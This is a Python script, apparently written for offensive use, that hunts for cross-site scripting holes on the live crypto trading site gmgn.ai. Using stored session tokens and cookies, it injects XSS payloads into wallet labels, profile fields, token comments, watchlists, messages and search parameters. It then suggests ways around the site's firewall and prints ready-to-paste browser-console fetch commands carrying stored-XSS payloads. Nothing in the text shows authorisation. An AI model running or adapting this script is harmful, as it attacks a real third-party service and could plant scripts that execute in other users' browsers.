#!/usr/bin/env python3
"""
XSS HUNTER V2 - Find NEW injection vectors
Strategy: Test EVERY input field that accepts user data
"""
import json
import requests
from datetime import datetime

with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "acf898c7-5063-4d0f-b992-d1e5d568409e",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260712-1986-3641f8b",
    "from_app": "gmgn",
    "app_ver": "20260712-1986-3641f8b",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
    "worker": "0"
}

# XSS payloads (stealth to aggressive)
PAYLOADS = [
    "{{7*7}}",  # Template injection
    "<script>1</script>",  # Script tag
    "<img src=x onerror=alert(1)>",  # Event handler
    "javascript:alert(1)",  # Protocol handler
    "';alert(1);//",  # SQL/JS injection
    "\"><svg onload=alert(1)>",  # Attribute escape
]

print("="*80)
print("🦊 XSS HUNTER V2 - FINDING NEW VECTORS")
print("="*80)

results = []

# ============================================================================
# VECTOR SET 1: ACCOUNT/PROFILE ENDPOINTS
# ============================================================================
print("\n[1] ACCOUNT/PROFILE ENDPOINTS")
print("-" * 60)

# Test: Wallet nickname/label
print("\n   [1.1] Wallet nickname/label")
test_endpoints = [
    ("/account/wallet/add", {"address": "0x0000000000000000000000000000000000000001", "chain": "bsc", "nickname": "PAYLOAD"}),
    ("/account/wallet/update", {"address": "0x0000000000000000000000000000000000000001", "chain": "bsc", "nickname": "PAYLOAD"}),
    ("/xapi/v1/wallet/update", {"address": "0x0000000000000000000000000000000000000001", "chain": "bsc", "label": "PAYLOAD"}),
]

for endpoint, payload_template in test_endpoints:
    for payload in PAYLOADS[:2]:  # Only test first 2
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n      Testing: {endpoint}")
        print(f"      Payload: {payload[:40]}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            print(f"      Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                print(f"      Response: {json.dumps(d, indent=2)[:200]}")
                if d.get("code") == 0:
                    print(f"      ✅ ACCEPTED! Potential XSS vector!")
                    results.append({"vector": "wallet_label", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"      Error: {str(e)[:100]}")

# Test: User profile fields
print("\n   [1.2] User profile fields")
profile_endpoints = [
    ("/account/user/update", {"username": "PAYLOAD", "bio": "PAYLOAD", "avatar": "PAYLOAD"}),
    ("/account/profile/update", {"display_name": "PAYLOAD", "description": "PAYLOAD"}),
    ("/api/v1/user/profile", {"nickname": "PAYLOAD", "signature": "PAYLOAD"}),
]

for endpoint, payload_template in profile_endpoints:
    for payload in PAYLOADS[:2]:
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n      Testing: {endpoint}")
        print(f"      Payload: {payload[:40]}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            print(f"      Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f"      ✅ ACCEPTED!")
                    results.append({"vector": "profile", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"      Error: {str(e)[:100]}")

# ============================================================================
# VECTOR SET 2: TOKEN/ASSET COMMENTS & NOTES
# ============================================================================
print("\n[2] TOKEN/ASSET COMMENTS & NOTES")
print("-" * 60)

comment_endpoints = [
    ("/api/v1/token/note/create", {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "note": "PAYLOAD"}),
    ("/xapi/v1/token/comment", {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "comment": "PAYLOAD"}),
    ("/api/v1/comment/create", {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "content": "PAYLOAD"}),
]

for endpoint, payload_template in comment_endpoints:
    for payload in PAYLOADS[:2]:
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n   Testing: {endpoint}")
        print(f"   Payload: {payload[:40]}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                print(f"   Response: {json.dumps(d, indent=2)[:150]}")
                if d.get("code") == 0:
                    print(f"   ✅ ACCEPTED! Comment XSS vector found!")
                    results.append({"vector": "token_comment", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"   Error: {str(e)[:100]}")

# ============================================================================
# VECTOR SET 3: WATCHLIST/PORTFOLIO TAGS
# ============================================================================
print("\n[3] WATCHLIST/PORTFOLIO TAGS")
print("-" * 60)

watchlist_endpoints = [
    ("/xapi/v1/watchlist/create", {"chain": "bsc", "name": "PAYLOAD", "description": "PAYLOAD"}),
    ("/api/v1/portfolio/create", {"name": "PAYLOAD", "note": "PAYLOAD"}),
    ("/xapi/v1/token/tag/add", {"token_address": "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", "chain": "bsc", "tag": "PAYLOAD"}),
]

for endpoint, payload_template in watchlist_endpoints:
    for payload in PAYLOADS[:2]:
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n   Testing: {endpoint}")
        print(f"   Payload: {payload[:40]}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f"   ✅ ACCEPTED! Watchlist XSS vector found!")
                    results.append({"vector": "watchlist", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"   Error: {str(e)[:100]}")

# ============================================================================
# VECTOR SET 4: NOTIFICATION/MESSAGE ENDPOINTS
# ============================================================================
print("\n[4] NOTIFICATION/MESSAGE ENDPOINTS")
print("-" * 60)

message_endpoints = [
    ("/api/v1/message/send", {"recipient_id": "00000000-0000-0000-0000-000000000000", "content": "PAYLOAD"}),
    ("/xapi/v1/notification/preference", {"label": "PAYLOAD", "description": "PAYLOAD"}),
    ("/api/v1/feedback/submit", {"category": "bug", "message": "PAYLOAD", "contact": "PAYLOAD"}),
]

for endpoint, payload_template in message_endpoints:
    for payload in PAYLOADS[:2]:
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n   Testing: {endpoint}")
        print(f"   Payload: {payload[:40]}")
        try:
            r = requests.post(
                f"https://gmgn.ai{endpoint}",
                params=PARAMS,
                headers=HEADERS,
                cookies=cookies,
                json=data,
                timeout=10
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f"   ✅ ACCEPTED! Message XSS vector found!")
                    results.append({"vector": "message", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"   Error: {str(e)[:100]}")

# ============================================================================
# VECTOR SET 5: SEARCH/FILTER PARAMETERS (Reflected XSS)
# ============================================================================
print("\n[5] SEARCH/FILTER PARAMETERS (Reflected XSS)")
print("-" * 60)

search_endpoints = [
    ("/api/v1/search", {"q": "PAYLOAD", "type": "token"}),
    ("/xapi/v1/token/search", {"keyword": "PAYLOAD", "chain": "bsc"}),
    ("/api/v1/wallet/search", {"address": "PAYLOAD"}),
]

for endpoint, payload_template in search_endpoints:
    for payload in PAYLOADS[:2]:
        data = {k: v.replace("PAYLOAD", payload) if isinstance(v, str) else v for k, v in payload_template.items()}
        print(f"\n   Testing: {endpoint}")
        print(f"   Payload: {payload[:40]}")
        try:
            r = requests.get(
                f"https://gmgn.ai{endpoint}",
                params={**PARAMS, **data},
                headers=HEADERS,
                cookies=cookies,
                timeout=10
            )
            print(f"   Status: {r.status_code}")
            if r.status_code == 200:
                # Check if payload is reflected in response
                if payload in r.text or payload.replace("<", "&lt;") in r.text:
                    print(f"   ✅ REFLECTED! Potential reflected XSS!")
                    results.append({"vector": "search_reflected", "endpoint": endpoint, "payload": payload})
                    break
        except Exception as e:
            print(f"   Error: {str(e)[:100]}")

# ============================================================================
# SUMMARY
# ============================================================================
print("\n" + "="*80)
print("📊 XSS HUNTER RESULTS")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} potential XSS vectors!\n")
    for i, r in enumerate(results, 1):
        print(f"{i}. {r['vector']} @ {r['endpoint']}")
        print(f"   Payload: {r['payload']}")
        print()
    
    # Save results
    with open("xss_vectors_found.json", "w") as f:
        json.dump(results, f, indent=2)
    print("💾 Saved to: xss_vectors_found.json")
else:
    print("\n❌ No vectors found via Python (WAF blocking)")
    print("\n💡 NEXT STRATEGY:")
    print("   1. Test in BROWSER CONSOLE (bypasses WAF)")
    print("   2. Try GET params instead of POST body")
    print("   3. Look for file upload fields (SVG/HTML uploads)")
    print("   4. Test WebSocket messages")
    print("   5. Check for JSONP/CORS misconfig (token in URL)")

print("\n" + "="*80)
print("🦊 BROWSER TESTING COMMANDS")
print("="*80)
print("\nPaste these in gmgn.ai browser console (F12):\n")

print("// Test 1: Wallet label XSS")
print("""
fetch('https://gmgn.ai/account/wallet/update?device_id=acf898c7-5063-4d0f-b992-d1e5d568409e&fp_did=5154d56b50e3061629dca8bf8538b346&client_id=gmgn_web_20260712-1986-3641f8b&from_app=gmgn&app_ver=20260712-1986-3641f8b&tz_name=Asia/Aden&tz_offset=10800&app_lang=en-US&os=web&worker=0', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    address: '0x0000000000000000000000000000000000000001',
    chain: 'bsc',
    nickname: '<img src=x onerror=alert(document.domain)>'
  })
}).then(r=>r.json()).then(d=>console.log('Result:', d));
""")

print("\n// Test 2: Token comment XSS")
print("""
fetch('https://gmgn.ai/api/v1/token/note/create?device_id=acf898c7-5063-4d0f-b992-d1e5d568409e&fp_did=5154d56b50e3061629dca8bf8538b346&client_id=gmgn_web_20260712-1986-3641f8b&from_app=gmgn&app_ver=20260712-1986-3641f8b&tz_name=Asia/Aden&tz_offset=10800&app_lang=en-US&os=web&worker=0', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    token_address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',
    chain: 'bsc',
    note: '<svg onload=alert(document.domain)>'
  })
}).then(r=>r.json()).then(d=>console.log('Result:', d));
""")

print("\n// Test 3: Search reflected XSS")
print("""
fetch('https://gmgn.ai/api/v1/search?q=<script>alert(1)</script>&type=token&device_id=acf898c7-5063-4d0f-b992-d1e5d568409e&fp_did=5154d56b50e3061629dca8bf8538b346&client_id=gmgn_web_20260712-1986-3641f8b&from_app=gmgn&app_ver=20260712-1986-3641f8b', {
  credentials: 'include'
}).then(r=>r.text()).then(t=>console.log('Response contains payload?', t.includes('<script>')));
""")
